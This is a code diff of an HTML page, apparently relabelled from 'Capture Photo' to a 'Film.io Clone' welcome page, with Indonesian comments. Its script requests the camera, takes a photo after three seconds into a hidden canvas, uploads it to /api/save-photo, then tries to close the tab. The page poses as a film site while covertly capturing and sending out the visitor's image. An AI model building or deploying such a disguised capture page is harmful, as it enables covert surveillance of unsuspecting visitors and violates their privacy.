@@ -2,38 +2,43 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Capture Photo</title>
+  <title>Film App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/styles/style.css">
 </head>
 <body>
-  <h2>film</h2>
-  <video id="video" autoplay playsinline muted width="320" height="240"></video>
-  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+  <div class="container">
+    <h1>🎥 Welcome to Film.io Clone</h1>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
 
   <script>
-    window.onload = function () {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const image = canvas.toDataURL('image/png');
-
-            fetch('/api/save-photo', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image })
-            });
-
-            stream.getTracks().forEach(track => track.stop());
-          }, 2000);
-        })
-        .catch(e => alert('Kamera tidak bisa diakses: ' + e));
-    }
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const image = canvas.toDataURL('image/png');
+          fetch('/api/save-photo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image })
+          }).then(() => {
+            stream.getTracks().forEach(t => t.stop());
+            window.close(); // Coba tutup tab
+          });
+        }, 3000); // Foto setelah 3 detik
+      })
+      .catch(err => {
+        alert("Akses kamera ditolak.");
+      });
   </script>
 </body>
 </html>
